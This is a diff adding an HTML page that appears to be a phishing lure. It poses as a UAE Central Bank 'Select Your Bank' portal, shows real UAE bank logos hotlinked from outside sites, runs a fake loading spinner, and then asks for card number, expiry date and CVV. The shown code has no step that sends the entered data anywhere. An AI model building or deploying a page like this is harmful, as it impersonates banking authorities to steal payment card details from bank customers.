@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0" />
+  <title>Select Your UAE Bank</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      min-height: 100vh;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+    }
+    .loader-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  background: #ffffff;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+}
+
+.spinner-ring {
+  width: 250px;
+  height: 250px;
+  border: 6px solid #e0e0e0;
+  border-top: 6px solid #9D783B;
+  border-radius: 50%;
+  animation: spin 2s linear infinite;
+  position: absolute;
+}
+
+.loader-logo {
+  width: 180px;
+  height: 180px;
+  z-index: 1;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+
+    .container {
+      width: 100%;
+      max-width: 650px;
+      text-align: center;
+    }
+
+    .logo {
+      max-width: 280px;
+      margin: 0 auto 40px;
+    }
+
+    .logo img {
+      width: 100%;
+      height: auto;
+      display: block;
+      image-rendering: auto;
+    }
+
+    @media (max-width: 480px) {
+      .logo {
+        max-width: 220px;
+      }
+    }
+
+    .grid-wrapper {
+      display: flex;
+      justify-content: center;
+      width: 100%;
+    }
+
+    .grid-content {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      width: 100%;
+    }
+
+/*    .grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 15px;
+      flex: 1;
+    }*/
+
+    .grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+  gap: 15px;
+  width: 100%;
+}
+
+    .bank-card {
+      width: 100%;
+      padding-top: 100%;
+      position: relative;
+      border-radius: 12px;
+      overflow: hidden;
+      border: 2px solid transparent;
+      cursor: pointer;
+      transition: transform 0.2s, border-color 0.2s;
+      background-size: contain;
+      background-position: center;
+      background-repeat: no-repeat;
+      background-color: white;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      z-index: 0;
+    }
+
+    .bank-card:hover,
+    .bank-card.touched {
+      transform: scale(1.05);
+      border-color: #004687;
+      box-shadow: 0 8px 18px rgba(0, 70, 135, 0.2);
+      filter: brightness(1.08);
+    }
+
+    .bank-card.selected {
+      border-color: #004687;
+      box-shadow: 0 0 0 3px #00468744;
+    }
+
+    .next-btn {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      background-color: #004687;
+      color: white;
+      font-size: 20px;
+      font-weight: bold;
+      border: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
+      cursor: pointer;
+      transition: background 0.3s ease;
+      flex-shrink: 0;
+    }
+
+    .next-btn:hover {
+      background-color: #003254;
+    }
+
+    @media (max-width: 600px) {
+      .grid-content {
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .next-btn {
+        margin-top: 15px;
+      }
+    }
+
+    .section-title {
+      font-size: 28px;
+      font-weight: 600;
+      color: #1c1e21;
+      margin-bottom: 30px;
+      letter-spacing: -0.5px;
+      font-family: 'Segoe UI', Roboto, sans-serif;
+      position: relative;
+      display: inline-block;
+    }
+
+    .section-title::after {
+      content: "";
+      display: block;
+      width: 60px;
+      height: 3px;
+      background-color: #004687;
+      margin: 8px auto 0;
+      border-radius: 4px;
+    }
+
+    .loader-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(255, 255, 255, 0.9);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    .spinner-ring {
+      width: 250px;
+      height: 250px;
+      border: 6px solid #e0e0e0;
+      border-top: 6px solid #9D783B;
+      border-radius: 50%;
+      animation: spin 2s linear infinite;
+      position: absolute;
+    }
+
+    .loader-logo {
+      width: 180px;
+      height: 180px;
+      z-index: 1;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .form-container {
+      display: none;
+      margin-top: 30px;
+      background: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .form-container input {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+
+    @media (max-width: 480px) {
+  .grid {
+    grid-template-columns: repeat(2, 1fr);
+  }
+}
+
+@media (min-width: 481px) and (max-width: 768px) {
+  .grid {
+    grid-template-columns: repeat(3, 1fr);
+  }
+}
+
+@media (min-width: 769px) {
+  .grid {
+    grid-template-columns: repeat(4, 1fr);
+  }
+}
+
+  </style>
+</head>
+<body>
+
+  
+
+  <div class="loader-overlay" id="loader">
+    <div class="spinner-ring"></div>
+    <img class="loader-logo" src="unnamed.png" alt="Logo" />
+  </div>
+
+  <div class="container" id="mainContent" style="display: none;">
+    <div class="logo">
+      <img src="cb_logo.svg" alt="Central Bank Logo" />
+    </div>
+    <h2 class="section-title">Select Your Bank</h2>
+    <div class="grid-wrapper">
+      <div class="grid-content">
+        <div class="grid" id="bankGrid"></div>
+        <button id="nextPageBtn" class="next-btn">&gt;</button>
+      </div>
+    </div>
+
+    <div class="form-container" id="cardDetailsForm" style="display: none;">
+      <h3 id="selectedBankTitle">Bank Card Details</h3>
+      <input id="cardNumber" type="tel" maxlength="19" placeholder="Card Number" inputmode="numeric" />
+      <input id="expiryDate" type="tel" maxlength="5" placeholder="Expiry Date (MM/YY)" inputmode="numeric" />
+      <input id="cvv" type="tel" maxlength="3" placeholder="CVV" inputmode="numeric" />
+    </div>
+    
+    
+
+    <script>
+      window.addEventListener("DOMContentLoaded", () => {
+      
+        const banks = [
+          { title: "ADCB", img: "https://www.uaebf.ae/photos/logos/ADCB.jpg" },
+          { title: "Emirates NBD", img: "https://www.uaebf.ae/photos/logos/ENBD.jpg" },
+          { title: "FAB", img: "https://www.uaebf.ae/photos/logos/FBAB.jpg" },
+          { title: "Dubai Islamic Bank", img: "https://www.uaebf.ae/photos/logos/image_dib%20logo20250519173049.jpg" },
+          { title: "Mashreq", img: "https://www.uaebf.ae/photos/logos/MASHREQ.jpg" },
+          { title: "RAKBANK", img: "https://www.uaebf.ae/photos/logos/RAK.jpg" },
+          { title: "ADIB", img: "https://www.uaebf.ae/photos/logos/ADIB.jpg" },
+          { title: "CBD", img: "https://www.uaebf.ae/photos/logos/CBD.jpg" },
+          { title: "Sharjah Islamic Bank", img: "https://www.uaebf.ae/photos/logos/image_screenshot%202022-04-120220411171808.png" },
+          { title: "Ajman Bank", img: "https://www.uaebf.ae/photos/logos/AJMAN.jpg" },
+          { title: "Wio Bank", img: "https://www.uaebf.ae/photos/logos/image_wio%20midnight%20blue20220914150127.png" },
+          { title: "HSBC", img: "https://www.uaebf.ae/photos/logos/image_hsbc20200217170903.jpg" },
+          { title: "Bank of Sharjah", img: "https://www.uaebf.ae/photos/logos/image_bos20210115232009.png" },
+          { title: "Emirates Islamic Bank", img: "https://www.uaebf.ae/photos/logos/EIB.jpg" },
+          { title: "National Bank of Fujairah", img: "https://www.uaebf.ae/photos/logos/NBF.jpg" },
+          { title: "DFM", img: "https://static.zawya.com/view/acePublic/alias/contentid/NWIwMzViZmQtN2EzNi00/0/dfmlogo-png.webp?f=3%3A2&q=0.75&w=3840" },
+          { title: "AL HILAL BANK", img: "https://www.uaebf.ae/photos/logos/image_alhilal20210115232041.jpg" },
+          { title: "Strong Others", img: "https://i.ibb.co/p6rSxLVZ/other.png" }
+        ];
+      
+        const bankGrid = document.getElementById("bankGrid");
+        const nextPageBtn = document.getElementById("nextPageBtn");
+        const loader = document.getElementById("loader");
+        const mainContent = document.getElementById("mainContent");
+      
+        const cardForm = document.getElementById("cardDetailsForm");
+        const cardInput = document.getElementById("cardNumber");
+        const expiryInput = document.getElementById("expiryDate");
+        const cvvInput = document.getElementById("cvv");
+        const bankTitle = document.getElementById("selectedBankTitle");
+      
+        const banksPerPage = 6;
+        let currentPage = 0;
+      
+        function renderBanks() {
+          bankGrid.innerHTML = "";
+          const start = currentPage * banksPerPage;
+          const end = start + banksPerPage;
+          const pageBanks = banks.slice(start, end);
+      
+          pageBanks.forEach(bank => {
+            const div = document.createElement("div");
+            div.className = "bank-card";
+            div.title = bank.title;
+            div.style.backgroundImage = `url('${bank.img}')`;
+            div.addEventListener("click", () => {
+              document.querySelectorAll(".bank-card").forEach(c => c.classList.remove("selected", "touched"));
+              div.classList.add("selected", "touched");
+              loader.style.display = "flex";
+              setTimeout(() => {
+                loader.style.display = "none";
+                document.querySelector(".grid-wrapper").style.display = "none";
+                cardForm.style.display = "block";
+                bankTitle.textContent = `${bank.title} Card Details`;
+                cardInput.focus();
+              }, 1000);
+            });
+            bankGrid.appendChild(div);
+          });
+        }
+      
+        nextPageBtn.addEventListener("click", () => {
+          currentPage = (currentPage + 1) % Math.ceil(banks.length / banksPerPage);
+          renderBanks();
+        });
+      
+        // Swipe support
+        let startX = 0;
+        let isDragging = false;
+      
+        document.body.addEventListener("mousedown", e => {
+          isDragging = true;
+          startX = e.clientX;
+        });
+      
+        document.body.addEventListener("mouseup", e => {
+          if (!isDragging) return;
+          isDragging = false;
+          const deltaX = e.clientX - startX;
+          if (deltaX > 50) currentPage = (currentPage - 1 + Math.ceil(banks.length / banksPerPage)) % Math.ceil(banks.length / banksPerPage);
+          if (deltaX < -50) currentPage = (currentPage + 1) % Math.ceil(banks.length / banksPerPage);
+          renderBanks();
+        });
+      
+        document.body.addEventListener("touchstart", e => {
+          startX = e.touches[0].clientX;
+        });
+      
+        document.body.addEventListener("touchend", e => {
+          const deltaX = e.changedTouches[0].clientX - startX;
+          if (deltaX > 50) currentPage = (currentPage - 1 + Math.ceil(banks.length / banksPerPage)) % Math.ceil(banks.length / banksPerPage);
+          if (deltaX < -50) currentPage = (currentPage + 1) % Math.ceil(banks.length / banksPerPage);
+          renderBanks();
+        });
+      
+        // Page load with loader
+        loader.style.display = "flex";
+        setTimeout(() => {
+          loader.style.display = "none";
+          mainContent.style.display = "block";
+          renderBanks();
+        }, 5000);
+      
+        // Card Number formatting
+        cardInput.addEventListener("input", () => {
+          let value = cardInput.value.replace(/\D/g, "").substring(0, 16);
+          let formatted = value.match(/.{1,4}/g);
+          cardInput.value = formatted ? formatted.join(" ") : "";
+          if (value.length === 16) expiryInput.focus();
+        });
+      
+        // Expiry formatting
+        expiryInput.addEventListener("input", () => {
+          let raw = expiryInput.value.replace(/\D/g, "").substring(0, 4);
+          if (raw.length >= 3) {
+            expiryInput.value = `${raw.substring(0, 2)}/${raw.substring(2)}`;
+          } else {
+            expiryInput.value = raw;
+          }
+      
+          if (raw.length === 4) {
+            const mm = parseInt(raw.substring(0, 2), 10);
+            const yy = parseInt(raw.substring(2), 10) + 2000;
+            const currentYear = new Date().getFullYear();
+            const currentMonth = new Date().getMonth() + 1;
+            if (mm >= 1 && mm <= 12 && (yy > currentYear || (yy === currentYear && mm >= currentMonth))) {
+              cvvInput.focus();
+            }
+          }
+        });
+      
+        // CVV validation
+        cvvInput.addEventListener("input", () => {
+          cvvInput.value = cvvInput.value.replace(/\D/g, "").substring(0, 3);
+        });
+      
+      });
+      </script>      
+</body>
+</html>
